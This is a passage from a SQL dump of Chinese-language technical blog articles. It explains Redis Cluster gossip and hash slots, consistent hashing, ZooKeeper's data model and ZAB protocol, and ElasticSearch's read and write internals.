集中式与gossip\n维护集群的元数据，一种叫做集中式，还有一种叫做gossip\n集中式：\n好处在于，元数据的更新和读取，时效性非常好，一旦元数据出现了变更，立即就更新到集中式的存储中，其他节点读取的时候立即就可以感知到;\n不好在于，所有的元数据的跟新压力全部集中在一个地方，可能会导致元数据的存储有压力\ngossip：\n好处在于，元数据的更新比较分散，不是集中在一个地方，更新请求会陆陆续续，打到所有节点上去更新，有一定的延时，降低了压力; \n不好在于，元数据更新有延时，可能导致集群的一些操作会有一些滞后\n\n1. 基础通信原理\n	(1) redis cluster节点间采取gossip协议进行通信\n	跟集中式不同，不是将集群元数据（节点信息，故障，等等）集中存储在某个节点上，而是互相之间不断通信，保持整个集群所有节点的数据是完整的\n	(2) 10000端口\n	每个节点都有一个专门用于节点间通信的端口，就是自己提供服务的端口号+10000，比如7001，那么用于节点间通信的就是17001端口\n	每个节点每隔一段时间都会往另外几个节点发送ping消息，同时其他几点接收到ping之后返回pong\n	（3）节点间交换的信息\n	故障信息，节点的增加和移除，hash slot信息，等等\n2、gossip协议\n	gossip协议包含多种消息，包括meet，ping，pong，fail，等等\n	(1) meet: 某个节点发送meet给新加入的节点，让新节点加入集群中，然后新节点就会开始与其他节点进行通信\n	(2) ping: 每个节点都会频繁给其他节点发送ping，其中包含自己的状态还有自己维护的集群元数据，互相通过ping交换元数据\n				每个节点每秒都会频繁发送ping给其他的集群，ping，频繁的互相之间交换数据，互相进行元数据的更新\n	(3) pong: 返回ping和meet，包含自己的状态和其他信息，也可以用于信息广播和更新\n	(4) fail: 某个节点判断另一个节点fail之后，就发送fail给其他节点，通知其他节点，指定的节点宕机了\n3、ping消息深入\n	(1) ping很频繁，而且要携带一些元数据，所以可能会加重网络负担\n	(2) 每个节点每秒会执行10次ping，每次会选择5个最久没有通信的其他节点\n	(3) 当然如果发现某个节点通信延时达到了cluster_node_timeout / 2，那么立即发送ping，避免数据交换延时过长，落后的时间太长了\n	比如说，两个节点之间都10分钟没有交换数据了，那么整个集群处于严重的元数据不一致的情况，就会有问题\n	所以cluster_node_timeout可以调节，如果调节比较大，那么会降低发送的频率\n	(4) 每次ping，一个是带上自己节点的信息，还有就是带上1/10其他节点的信息，发送出去，进行数据交换至少包含3个其他节点的信息，最多包含总节点-2个其他节点的信息\n\n// 面向集群的jedis内部实现原理\n1. 基于重定向的客户端\n	(1) 请求重定向\n	客户端可能会挑选任意一个redis实例去发送命令，每个redis实例接收到命令，都会计算key对应的hash slot\n	如果在本地就在本地处理，否则返回moved给客户端，让客户端进行重定向\n	cluster keyslot mykey，可以查看一个key对应的hash slot是什么\n	控制台中输入redis-cli的时候，可以加入-c参数，支持自动的请求重定向，redis-cli接收到moved之后，会自动重定向到对应的节点执行命令\n	（2）计算hash slot\n	计算hash slot的算法，就是根据key计算CRC16值，然后对16384取模，拿到对应的hash slot\n	用hash tag可以手动指定key对应的slot，同一个hash tag下的key，都会在一个hash slot中，比如set mykey1:{120}和set mykey2:{120}\n	（3）hash slot查找\n	节点间通过gossip协议进行数据交换，就知道每个hash slot在哪个节点上\n2. smart jedis\n	（1）什么是smart模式\n	基于重定向的客户端，很消耗网络IO，因为大部分情况下，可能都会出现一次请求重定向，才能找到正确的节点\n	所以大部分的客户端，比如java redis客户端jedis，都是smart的\n	本地维护一份hashslot -> node的映射表，基于缓存，大部分情况下，直接走本地缓存就可以找到hashslot -> node，不需要通过节点进行moved重定向\n	（2）JedisCluster的工作原理\n	在JedisCluster初始化的时候，就会随机选择一个node，在那个node上初始化hashslot -> node映射表，同时为每个节点创建一个JedisPool连接池\n	每次基于JedisCluster执行操作，首先JedisCluster都会在本地计算key的hashslot，然后在本地映射表找到对应的节点\n	如果那个node正好还是持有那个hashslot，那么就ok; 如果说进行了reshard这样的操作，可能hashslot已经不在那个node上了，就会返回moved\n	如果JedisCluter API发现对应的节点返回moved，那么利用该节点的元数据，更新本地的hashslot -> node映射表缓存\n	重复上面几个步骤，直到找到对应的节点，如果重试超过5次，那么就报错，JedisClusterMaxRedirectionException\n	jedis老版本，可能会出现在集群某个节点故障还没完成自动切换恢复时，频繁更新hash slot，频繁ping节点检查活跃，导致大量网络IO开销\n	jedis最新版本，对于这些过度的hash slot更新和ping，都进行了优化，避免了类似问题\n	（3）hashslot迁移和ask重定向\n	如果hash slot正在迁移，那么会返回ask重定向给jedis\n	jedis接收到ask重定向之后，会重新定位到目标节点去执行，但是因为ask发生在hash slot迁移过程中，所以JedisCluster API收到ask是不会更新hashslot本地缓存\n	如果是moved,可以确定说，hashslot已经迁移完了，moved是会更新本地hashslot->node映射表缓存的\n\n// 高可用性与主备切换原理\nredis cluster的高可用的原理，几乎跟哨兵是类似的\n1. 判断节点宕机\n	如果一个节点认为另外一个节点宕机，那么就是pfail，主观宕机\n	如果多个节点都认为另外一个节点宕机了，那么就是fail，客观宕机，跟哨兵的原理几乎一样，sdown，odown\n	在cluster-node-timeout内，某个节点一直没有返回pong，那么就被认为pfail\n	如果一个节点认为某个节点pfail了，那么会在gossip ping消息中，ping给其他节点，如果超过半数的节点都认为pfail了，那么就会变成fail\n2. 从节点过滤\n	对宕机的master node，从其所有的slave node中，选择一个切换成master node\n	检查每个slave node与master node断开连接的时间，如果超过了cluster-node-timeout * cluster-slave-validity-factor，那么就没有资格切换成master\n	这个也是跟哨兵是一样的，从节点超时过滤的步骤\n3. 从节点选举\n	每个从节点，都根据自己对master复制数据的offset，来设置一个选举时间，offset越大（复制数据越多）的从节点，选举时间越靠前，优先进行选举\n	所有的master node开始slave选举投票，给要进行选举的slave进行投票，如果大部分master node（N/2 + 1）都投票给了某个从节点，那么选举通过，那个从节点可以切换成master\n	从节点执行主备切换，从节点切换为主节点\n	哨兵是对所有从节点进行排序，根据slave priority，offset，run id\n4. 与哨兵比较\n	整个流程跟哨兵相比，非常类似，所以说，redis cluster功能强大，直接集成了replication和sentinal的功能\n\n```\n### 数据分布算法\n```java\n数据分布算法：\nhash\n一致性hash\nredis cluster的hash slot\n\n用不同的算法，就决定了在多个master节点的时候，数据如何分布到这些节点上去，解决这个问题\n\n```\n#### 简单取模hash算法\n![Redis简单取模hash算法.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623254477_Redis-简单取模hash算法.png)\n![Redis简单取模hash算法缺陷.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623254477_Redis-简单取模hash算法缺陷.png)\n```java\n// 最简单的取模hash算法\n1. 根据可用master节点的数量去定义取模数\n2. 若宕机造成取模数改变,导致取模的结果数值发生改变,导致大量数据无法从缓存中获取,从而使用大量请求涌入数据库进行缓存重建,造成数据库宕机风险\n\n```\n\n#### 一致性hash算法（自动缓存迁移）+虚拟节点（自动负载均衡）\n![Redis一致性hash算法.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623257142_Redis-一致性hash算法.png)\n![Redis一致性hash算法加虚拟节点.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623257142_Redis-一致性hash算法加虚拟节点.png)\n```java\n// 一致性hash算法（自动缓存迁移）+虚拟节点（自动负载均衡）\n// 一致性hash算法\n1. 一致性hash算法运用了一个圆环的设计\n2. 根据计算将得到的结果落在圆环的某个位置上,位置的数据从顺时针开始走,直到找到最近的节点,选择该节点\n3. 一致性hash算法,保证任何一个master宕机,只有之前在那个master数据会收到影响\n因为照着顺时针走,宕机的master不见了,原宕机master的数据会重新去数据库查一次,进行缓存重建,其他master的数据按照顺时针走,依旧可以找到\n4. 一致性hash算法存在热点缓存问题,数据可能集中在某个hash,区间内的值特别多,导致大量数据涌入一个master内,造成master热点问题,性能出现瓶颈\n\n// 虚拟节点\n1. 在一致性hash算法的基础上给每个master实体节点做了均匀分布的虚拟节点\n2. 这样的话,每隔一段区间内,大量的数据都会均匀的,分布到不同的节点内,而不是按照顺时针走,导致全部涌入一个master节点\n3. 解决了一致性hash算法存在热点缓存问题\n\n```\n#### redis cluster的hash slot\n![RedisRedisCluster的HashSlot.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623303452_Redis-RedisCluster的HashSlot.png)\n```java\n// redis cluster的hash slot\n1. redis cluster有固定的16384个hash slot，对每个key计算CRC16值，然后对16384取模，可以获取key对应的hash slot\n2. redis cluster中每个master都会持有部分slot，比如有3个master，那么可能每个master持有5000多个hash slot\n3. hash slot让node的增加和移除很简单，增加一个master，就将其他master的hash slot移动部分过去，减少一个master，就将它的hash slot移动到其他master上去,移动hash slot的成本是非常低的\n客户端的api，可以对指定的数据，让他们走同一个hash slot，通过hash tag来实现\n4. 宕机时,其他的master节点会将该宕机master上的hash slot移动到他们中去\n\n```', 0, 0, 125, 0, 0, '2019-07-18 15:57:35', '2020-09-20 15:57:35', 0, 0);
INSERT INTO `article` VALUES (31, 1, 'zookeeper基本概述与使用场景', '2018/8/1535442556_0d2e3a9d9fb049d0b3acf94f9d5b9e4c.jpg', '### 存储结构\n![zookeeper存储结构.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624117264_zookeeper-存储结构.png)\n```java\n// 概述\nzookeeper是目录形(树形)存储结构,节点信息不允许重复,子节点信息无限递增\nzookeeper是分布式协调工具,用于协调分布式的中间件\n许多分布式框架所依赖的协调工具\n\n// 节点类型\n核心数据模型是znode树，往zk写数据就是创建树形结构的znode，里面可以写入值，这就是数据模型，都在zk内存里存放\n有两种节点，持久节点和临时节点，持久节点就是哪怕客户端断开连接，一直存在\n(1) 临时节点，只要客户端断开连接，节点就没了\n(2) 临时顺序节点，创建临时节点时自增加全局递增的序号,curator框架中zk分布式锁的实现，在里面就是基于zk的临时顺序节点来实现的\n(3) 持久节点: 同临时节点,不过是永久保存在硬盘,断开连接不会导致节点没了\n(4) 持久顺序节点: 同临时顺序节点,不过是永久保存在硬盘\n如果做元数据存储，肯定是用持久节点\n如果做分布式协调和通知，很多时候是用临时节点，比如我创建一个临时节点，别人来监听这个节点的变化，如果我断开连接了临时节点消失，此时人家会感知到就会来做点别的事情\n每个znode还有一个Stat用来存放数据版本，version（znode的版本），cversion（znode子节点的版本），aversion（znode的ACL权限控制版本）\n\n// Watcher监听回调\nZooKeeper最核心的机制，客户端可以对znode进行Watcher监听，然后znode改变的时候回调通知这个客户端\n这个是非常有用的一个功能，在分布式系统的协调中是很有必要的\n分布式系统的协调需求：\n分布式架构中的系统A监听一个数据的变化，如果分布式架构中的系统B更新了那个数据/节点，zk反过来通知系统A这个数据的变化\n比如 /usr/local/uid\n\n// 应用场景\n分布式协调: 服务A对zk中的数据做了变更，zk会反过来去通知其他监听这个数据的服务，告诉其他服务这个数据变更了\n分布式锁: 运用于分布式的Java业务系统中,用于多JVM间的锁\n元数据/配置信息管理: Kafka、Canal等服务中间件本身都是分布式架构，分布式集群在运行，需要一个地方集中式的存储和管理分布式集群的核心元数据，所以他们都选择把核心元数据放在zookeeper中的\nHA高可用性: 部署主备两个NameNode，只有一个可以通过zk选举成为Master，另外一个backup\n\n```\n### 架构设计特点\n![Zookeeper架构设计特点.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625112800_Zookeeper-架构设计特点.png)\n```java\n// zk的架构设计特点\n(1) 集群化部署：3~5台机器组成一个集群，每台机器都在内存保存了zk的全部数据，机器之间互相通信同步数据，客户端连接任何一台机器都可以\n(2) 树形结构的数据模型：znode，树形结构，数据模型简单，纯内存保存\n(3) 顺序写：集群中只有一台机器可以写，所有机器都可以读，所有写请求都会分配一个zk集群全局的唯一递增编号，zxid，保证各种客户端发起的写请求都是有顺序的\n(4) 数据一致性：集群中任何一台zk机器收到了写请求之后都会同步给其他机器，你连接到任何一台zk机器看到的数据最终都是一致的,zab的过半写机制保证顺序一致性,但也是最终一致性\n(5) 原子性：写入数据时要么全部机器都成功，要么全部机器都失败\n(6) 高可用：如果集群中某台机器宕机,保证数据绝对不能丢失\n(7) 实时性：一旦数据发生变更，要实时感知到\n\n高性能：每台zk机器都在内存维护数据，所以zk集群是高并发高性能的，如果让zk部署在高配置物理机上，一个3台机器的zk集群抗下每秒几万读请求没有问题\n高可用：只要集群中挂掉不超过一半的机器，都能保证可用，数据不会丢失，3台机器可以挂1台，5台机器可以挂2台\n高并发：基于纯内存数据结构来处理，并发能力是很高的，虽然只有一台机器进行写，但是高配置的物理机，比如16核32G，也可以写入几万QPS;而读，所有机器都可以读，3台机器的话，可以支撑十几万QPS\n\n// ZooKeeper集群里三种角色的机器\n(1) Leader: 集群会自动选举一个Leader出来,只有Leader是可以写的,负责同步与Follow的数据\n(2) Follower: 能同步数据和提供数据的读取，Leader挂了，Follower们会选举出新的Leader,参与选举参与zab的过半写\n(3) Observer: 能同步数据和提供数据的读取,但Observer不参与选举也不参与过半写\nObserver节点是不参与leader选举的，也不参与zab协议同步时候的过半写,除了这两样,其他和follower一样\nObserver不参与zab协议的过半写,所以可能数据存在不一致的问题\nObserver只是单纯的接收数据,同步数据,读取数据\n\n// 客户端与ZooKeeper之间的长连接和会话是什么\nzk集群启动后，会分配好角色，然后客户端就会跟zk建立连接，是TCP长连接,也就是建立了一个会话session，可以通过心跳感知到会话是否存在\n有一个sessionTimeout，如果连接断开了，只要客户端在指定时间内重新连接zk一台机器，就能继续保持session，否则session就超时了\n\nzk集群无论多少台机器，只能是一个leader进行写，单机写入最多每秒上万QPS，这是没法扩展的，所以zk是适合写少的场景\nfollower起码有2个或者4个,读可以有每秒几万QPS\n如果有更多的读请求,此时可以引入Observer节点，Observer就只是同步数据，提供读服务，可以无限的扩展机器\n\n```\n\n### 应用场景\n#### 分布式协调\n![zookeeper分布式协调.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623506189_zookeeper-分布式协调.png)\n```java\n1. 这个是zk很经典的用法，你A系统发送个请求到mq，然后B消息消费之后处理了。\n2. 那A系统如何知道B系统的处理结果？\n3. 用zk就可以实现分布式系统之间的协调工作。A系统发送请求之后可以在zk上对某个节点的值注册个监听器，一旦B系统处理完了就修改zk那个节点的值，A立马就可以收到通知。\n\n```\n#### 分布式锁\n![zookeeper分布式锁.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623556942_zookeeper-分布式锁.png)\n```java\n1. 对某一个数据连续发出两个修改操作，两个进程同时收到了请求，但是只能一个进程先执行另外一个进程再执行。\n2. 那么此时就可以使用zk分布式锁，一个进程接收到了请求之后先获取zk上的一把分布式锁，就是可以去创建一个临时节点，接着执行操作；\n3. 然后另外一个进程也尝试去创建那个znode，结果发现自己创建不了，因为被别人创建了,那只能等着，等第一个进程执行完了自己再执行\n\n实际上如图实现的这种zk分布式锁效率很低,zk的操作框架curator实现了用临时顺序节点来实现的分布式锁,比使用普通临时节点的简单实现性能要好\n\n```\n#### 元数据/配置管理\n![zookeeper元数据_配置管理场景.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623506189_zookeeper-元数据_配置管理场景.png)\n```java\n1. zk可以用作很多系统的配置信息的管理中心\n2. 比如kafka、dubbostorm等等很多分布式系统都会选用zk来做一些元数据、配置信息的管理\n\n```\n#### HA高可用性场景\n![zookeeperHA高可用场景.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623506189_zookeeper-HA高可用场景.png)\n```java\n1. 很多大数据系统，都选择基于zk来开发HA高可用机制，就是一个重要进程一般会做主备两个，主进程挂了立马通过zk感知到切换到备用进程\n\n```', 0, 0, 150, 0, 0, '2019-08-24 15:55:20', '2019-09-20 15:55:20', 0, 0);
INSERT INTO `article` VALUES (32, 1, 'zookeeper的zab协议', '2019/10/1570023055_mmexport1570022340458.jpg', '### zab协议\n```java\n在整个zk的架构和工作原理中，有一个非常关键的环节\nzk集群的数据同步是用什么协议做的,其实用的是特别设计的ZAB协议，\nZooKeeper Atomic Broadcast，ZooKeeper原子广播协议\n通过这个协议来进行zk集群间的数据同步,保证数据的一致性\n\n```\n### 主从同步\n![Zookeeperzab协议过半写.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625125458_Zookeeper-zab协议-过半写.png)\n```java\n对于zab协议的本质而言\n划分集群角色为主从架构,有Leader和Follower两种角色\n只有Leader可以接受写操作,Leader和Follower都可以读,Follower收到的写操作会转发给Leader\n// 主从同步流程\n(1) 当Leader收到写请求,会将请求转换为事务Proposal（提议）,Leader会向自己的本地磁盘日志文件写入事务请求信息\n(2) 随后,Leader会将事务Proposal同步发送给所有的Follower\n(3) 当Follower收到该事务后,Follower也会向自己的本地磁盘日志文件写入该事务信息,写入完成后向Leader发送ack,表示自己已完成\n(4) 只要Leader收到超过半数的Follower发送的ack,那么Leader会将该事务信息的数据正式写入内存,给客户端读取\n(5) 随后,Leader将会给所有的Follower发一个Commit消息，让所有Follower提交这个事务\n(6) Follower收到Leader发送的Commmit后,会将事务信息数据正式写入内,给客户端读取\n这是一种2PC两阶段提交的方式保证数据的一致性,zab的这种方式被称为过半写机制\n\n// 顺序一致性\n发起一个事务proposal之前，leader会分配一个全局唯一递增的事务id，zxid，通过这个可以严格保证顺序\nleader会为每个follower创建一个队列，里面放入要发送给follower的事务proposal，这是保证了一个同步的顺序性\n每个follower收到一个事务proposal之后，就需要立即写入本地磁盘日志中，写入成功之后就可以保证数据不会丢失了，然后返回一个ack给leader，然后过半follower都返回了ack\nleader自己先进行commit操作然后推送commit消息给全部follower,commit之后，就意味这个数据可以被读取到了\n\n// zk是强一致性还是最终一致性\n强一致性：只要写入一条数据，立马无论从zk哪台机器上都可以立马读到这条数据\n强一致性会让你的写入操作卡住，直到leader和全部follower都进行了commit之后，才能让写入操作返回，认为写入成功了\n此时只要写入成功，无论你从哪个zk机器查询，都是能查到的,这叫强一致性\n\n最终一致性：写入一条数据,方法返回你写入成功了，此时有可能你立马去其他zk机器上查是查不到的\n短暂时间是不一致的，但是过一会儿，最终一定会让其他机器同步这条数据，最终一定是可以查到的\n\n明显，ZAB协议机制，zk一定不是强一致性\n其实过半follower对事务proposal返回ack，就会发送commit给所有follower了,只要follower或者leader进行了commit，这个数据就会被客户端读取到了\n有可能有的follower已经commit了，但是有的follower还没有commit\n所以有可能其实某个客户端连接到follower01，可以读取到刚commit的数据，但是有的客户端连接到follower02在这个时间还没法读取到\n所以zk不是强一致的，leader不保证一条数据被全部follower都commit了才会让你读取到数据\n而是过程中可能你会在不同的follower上读取到不一致的数据，但是最终一定会全部commit后一致，让你读到一致的数据的\nzk官方给自己的定义叫做顺序一致性\n因此zk是最终一致性的，但是其实他比最终一致性更好一点，因为leader一定会保证所有的proposal同步到follower上都是按照顺序来走的，起码顺序不会乱\n全部follower的数据一致确实是最终才能实现一致的\n如果要求强一致性，可以手动调用zk的sync()操作\n\n```\n### 恢复模式与消息广播模式\n```java\n// 选举leader\n如果集群中的Leader崩溃宕机了,Follower们会重新选举出一个新的Leader保证集群继续运行\n只要有超过一半的机器，认可你是leader，你就可以被选举为leader\n比如\n3台机器组成一个zk集群,启动时只要有2台机器认可一台机器是Leader，那么他就可以成为leader了\n可以容忍不超过一半的机器宕机,3台的一半是1.5,所以只要有两台就可以继续运行,但是一台机器就无法继续运行\n剩余的2台机器，只要2台机器都认可其中某1台机器是leader,就可以选举出来一个leader了,但是1台机器时是没有办法自己选举自己的\n比如\n5台机器组成一个zk集群，只要3台机器就可以认可某台机器是leader；\n5的一半是2.5,所以最多可以允许2台机器宕机\nzk很重要的一点是宕机的机器数量只要小于全部leader和follower加起来数量的一半，他就可以正常工作\n因为有过半的机器存活下来，就可以选举新的leader\n\n// 恢复模式和消息广播模式\n(1) zk集群启动的时候，会进入恢复模式，选举一个leader出来\n(2) 随后leader等待集群中过半的follower跟他进行数据同步，只要过半follower完成数据同步，就会退出恢复模式，可以对外提供服务了,当然剩下的另一半还没完成同步的follower也会去跟leader进行数据同步的\n(3) 退出恢复模式后,此时会进入消息广播模式\n(4) 只有leader可以接受写请求，但是客户端可以随便连接leader或者follower，如果客户端连接到follower，follower会把写请求转发给leader\n(5) leader收到写请求，就会把请求同步给所有的follower，过半follower都说收到了，就再发commit给所有的follower，让大家提交这个请求事务\n(6) 如果leader突然宕机了,会进入恢复模式，重新选举一个leader，只要过半的follower机器都承认你是leader，就可以选举出来一个新leader\n(7) 新leader重新等待过半follower跟他同步，完了重新进入消息广播模式\n\n集群启动：恢复模式，leader选举（过半机器选举机制） + 数据同步\n消息写入：消息广播模式，leader采用2PC模式的过半写机制，给follower进行同步\n崩溃恢复：恢复模式，leader/follower宕机，只要剩余机器超过一半，集群宕机不超过一半的机器，就可以选举新的leader，数据同步\n\n// Observer\n除了leader和follower外,zk还有第三个角色Observer\nObserver节点是不参与leader选举的，也不参与zab协议同步时候的过半follower ack的那个环节,除了这两样,其他和follower一样\nObserver只会接收到leader的commit操作,没有事务proposal的这个环节,所以可能数据存在不一致的问题\nObserver只是单纯的接收数据,同步数据,读取数据\nzk集群无论多少台机器，只能是一个leader进行写，单机写入最多每秒上万QPS，这是没法扩展的，所以zk是适合写少的场景\nfollower起码有2个或者4个,读可以有每秒几万QPS\n如果有更多的读请求,此时可以引入Observer节点，Observer就只是同步数据，提供读服务，可以无限的扩展机器\n\n```\n### 保证数据一致性\n```java\n// leader未发送commit就宕机了\nLeader收到了过半的follower的ack，接着leader自己commit了\n但是还没来得及发送commit给所有follower自己就挂了，这个时候相当于leader的数据跟所有follower是不一致的\nzk得保证全部follower最终都得commit\n// leader收到请求后,未发送proposal就宕机了\nleader可能会自己收到了一个请求，结果没来得及发送proposal给所有follower之前就宕机了\n此时这个Leader上的这个请求应该是要被丢弃掉的\n\n// 未发送commit 如何解决\nleader崩溃的时候，会选举一个拥有事务zxid最大的机器作为新leader，\n这个新leader得检查事务日志，如果发现自己磁盘日志里有一个proposal，但是还没提交\n说明肯定是之前的老leader没来得及发送commit就挂了\n此时新leader就得作为老leader为这个proposal发送commit到其他所有的follower中去，这个就保证了之前老leader提交的事务已经会最终同步提交到所有follower里去\n// 未发送proposal 如何解决\n如果老leader自己磁盘日志里有一个事务proposal\n他启动之后跟新leader进行同步，发现这个事务proposal其实是不应该存在的，就直接丢弃掉就可以了\n\n// zxid 丢弃消息\n每一条事务的zxid是64位的，高32位是leader的epoch，认为是leader的版本；低32位是自增长的zxid\n老leader发送出去的proposal，高32位是1，低32位是11111\n如果一个leader自己刚把一个proposal写入本地磁盘日志，就宕机了，\n没来得及发送给全部的follower，此时新leader选举出来，他的epoch会自增长一位\n高32位变成2，低32位是继续自增长的zxid\n随后,老leader恢复了连接到集群是follower了，此时发现自己比新leader多出来一条proposal\n但是自己的epoch比新leader的epoch低了，所以就会丢弃掉这条数据\n\n// 为什么选事务zxid最大的机器作为新leader\nfollower们会挑选已经收到的事务zxid里最大的那个follower作为新的leader\n5个机器，1个leader + 4个follower\n1个leader把proposal发送给4个follower，其中3个folower（过半）都收到了proposal返回ack了，第四个follower没收到proposal\n此时leader执行自己的commit之后自己挂了，commit没送给follower\n剩余的4个follower，只要3个人投票一个人当leader，就是leader\n假设那3个收到proposal的follower都投票第四台没有收到proposal的follower当新leader的话,这条数据一定永久性丢失了\n所以会选择一个拥有事务zxid最大的机器作为新Leader\n然后其他的follower就会跟新leader进行同步，他给每个follower准备一个队列，然后把所有的proposal都发送给follower，只要过半follower都ack了，就会发送commit给follower\ncommit操作就是把这条数据加入内存中的znode树形数据结构里去，然后就对外可以看到了，也会去通知一些监听这个znode的人\n如果一个follower跟leader完全同步了，就会加入leader的同步follower列表中去，然后过半follower都同步完毕了，就可以对外继续提供服务了\n\n```', 0, 0, 107, 0, 0, '2019-08-25 21:31:03', '2020-03-19 21:31:03', 0, 0);
INSERT INTO `article` VALUES (33, 1, 'ElasticSearch读写原理与优化方案', '2021/6/1623127827_mmexport1623043895948.jpg', '### 写数据过程\n![ElasticSearch写流程.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623133104_ElasticSearch-写流程.png)\n```java\n// 简略步骤\n(1) 客户端选择一个node发送请求过去，选择的这个node就是coordinating node（协调节点）\n(2) coordinating node，对document进行路由，将请求转发给对应的node（有primary shard）\n(3) 实际的node上的primary shard处理请求，然后将数据同步到replica node\n(4) coordinating node，如果发现primary node和所有replica node都搞定之后，就返回响应结果给客户端\n\n// 具体步骤\n(1) 数据先写入内存buffer,在buffer里的时候数据是搜索不到的;同时将数据写入translog日志文件\n(2) 如果buffer快满了，或者到一定时间，就会将buffer数据refresh到一个新的segment file中，但是此时数据不是直接进入segment file的磁盘文件的，而是先进入os cache的。这个过程就是refresh。\n每隔1秒钟，es将buffer中的数据写入一个新的segment file，每秒钟会产生一个新的磁盘文件，segment file，这个segment file中就存储最近1秒内buffer中写入的数据,但是如果buffer里面此时没有数据，那不会执行refresh操作，每秒创建换一个空的segment file，如果buffer里面有数据，默认1秒钟执行一次refresh操作，刷入一个新的segment file中\n\n// os cache\n操作系统里面，磁盘文件其实都有一个东西，叫做os cache，操作系统缓存，就是说数据写入磁盘文件之前，会先进入os cache\n先进入操作系统级别的一个内存缓存中去只要buffer中的数据被refresh操作，刷入os cache中，就代表这个数据就可以被搜索到了\n为什么叫es是准实时的？NRT，near real-time，准实时。默认是每隔1秒refresh一次的，所以es是准实时的，因为写入的数据1秒之后才能被看到。\n可以通过es的restful api或者java api，手动执行一次refresh操作，就是手动将buffer中的数据刷入os cache中，让数据立马就可以被搜索到。\n只要数据被输入os cache中，buffer就会被清空了，因为不需要保留buffer了，数据在translog里面已经持久化到磁盘去一份了\n\n(3) 只要数据进入os cache，此时就可以让这个segment file的数据对外提供搜索了\n(4) 重复1~3步骤，新的数据不断进入buffer和translog，不断将buffer数据写入一个又一个新的segment file中去，每次refresh完buffer清空，translog保留。\n随着这个过程推进，translog会变得越来越大。\n当translog达到一定长度的时候，就会触发commit操作。\nbuffer中的数据，倒是好，每隔1秒就被刷到os cache中去，然后这个buffer就被清空了。\n所以说这个buffer的数据始终是可以保持住不会填满es进程的内存的。\n每次一条数据写入buffer，同时会写入一条日志到translog日志文件中去，所以这个translog日志文件是不断变大的，当translog日志文件大到一定程度的时候，就会执行commit操作。\n\n(5) commit操作发生第一步，就是将buffer中现有数据refresh到os cache中去，清空buffer\n(6) 将一个commit point写入磁盘文件，里面标识着这个commit point对应的所有segment file\n(7) 强行将os cache中目前所有的数据都fsync到磁盘文件中去\ntranslog日志文件的作用是什么？就是在你执行commit操作之前，数据要么是停留在buffer中，要么是停留在os cache中，无论是buffer还是os cache都是内存，一旦这台机器死了，内存中的数据就全丢了。\n所以需要将数据对应的操作写入一个专门的日志文件，translog日志文件中，一旦此时机器宕机，再次重启的时候，es会自动读取translog日志文件中的数据，恢复到内存buffer和os cache中去。\ncommit操作：1、写commit point；2、将os cache数据fsync强刷到磁盘上去；3、清空translog日志文件\n(8) 将现有的translog清空，然后再次重启启用一个translog，此时commit操作完成。\n默认每隔30分钟会自动执行一次commit，但是如果translog过大，也会触发commit。\n整个commit的过程，叫做flush操作。我们可以手动执行flush操作，就是将所有os cache数据刷到磁盘文件中去。\nes中的flush操作，就对应着commit的全过程。我们也可以通过es api，手动执行flush操作，手动将os cache中的数据fsync强刷到磁盘上去，记录一个commit point，清空translog日志文件。\n(9) translog其实也是先写入os cache的，默认每隔5秒刷一次到磁盘中去，所以默认情况下，可能有5秒的数据会仅仅停留在buffer或者translog文件的os cache中，如果此时机器挂了，会丢失5秒钟的数据。但是这样性能比较好，最多丢5秒的数据。\n也可以将translog设置成每次写操作必须是直接fsync到磁盘，但是性能会差很多。\n其实es第一是准实时的，数据写入1秒后可以搜索到；可能会丢失数据的，你的数据有5秒的数据，停留在buffer、translog os cache、segment file os cache中，有5秒的数据不在磁盘上，此时如果宕机，会导致5秒的数据丢失。\n如果你希望一定不能丢失数据的话，你可以设置个参数，官方文档，百度一下。每次写入一条数据，都是写入buffer，同时写入磁盘上的translog，但是这会导致写性能、写入吞吐量会下降一个数量级。本来一秒钟可以写2000条，现在你一秒钟只能写200条，都有可能。\n\n// 删除操作与更新操作\n1. 如果是删除操作，commit的时候会生成一个.del文件，里面将某个doc标识为deleted状态，那么搜索的时候根据.del文件就知道这个doc被删除了\n2. 如果是更新操作，就是将原来的doc标识为deleted状态，然后新写入一条数据\n\n// merge\n(1) buffer每次refresh一次，就会产生一个segment file，所以默认情况下是1秒钟一个segment file，segment file会越来越多，此时会定期执行merge\n(2) 每次merge的时候，会将多个segment file合并成一个，同时这里会将标识为deleted的doc给物理删除掉，然后将新的segment file写入磁盘，这里会写一个commit point，标识所有新的segment file，然后打开segment file供搜索使用，同时删除旧的segment file。\nes里的写流程，有4个底层的核心概念，refresh、flush、translog、merge\n当segment file多到一定程度的时候，es就会自动触发merge操作，将多个segment file给merge成一个segment file。\n\n```\n### 读数据过程\n![ElasticSearch读过程.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623136021_ElasticSearch-读过程.png)\n```java\n// 根据id的get查询\n查询，GET某一条数据，写入了某个document，这个document会自动给你分配一个全局唯一的id，docment id\n同时也是根据doc id进行hash路由到对应的primary shard上面去。也可以手动指定doc id，比如用订单id，用户id。\n你可以通过doc id来查询，会根据doc id进行hash，判断出来当时把doc id分配到了哪个shard上面去，从那个shard去查询\n\n// 全文检索的搜索\nes最强大的是做全文检索，就是比如你有三条数据\n中华 中华人民 中华人民共和国 \n你根据中华关键词来搜索，将包含中华的document给搜索出来\nes就会给你返回：中华 中华人民 中华人民共和国\n(1）客户端发送请求到任意一个node，成为coordinate node(协调节点)\n(2）协调节点将搜索请求转发到所有的shard对应的primary shard或replica shard也可以,此时会使用round-robin随机轮询算法，在primary shard以及其所有replica中随机选择一个，让读请求负载均衡\n(3）query phase：每个shard将自己的搜索结果（其实就是一些doc id），返回给协调节点，由协调节点进行数据的合并、排序、分页等操作，产出最终结果\n(4）fetch phase：接着由协调节点，根据doc id去各个节点上拉取实际的document数据，最终返回给客户端\n\n```\n### 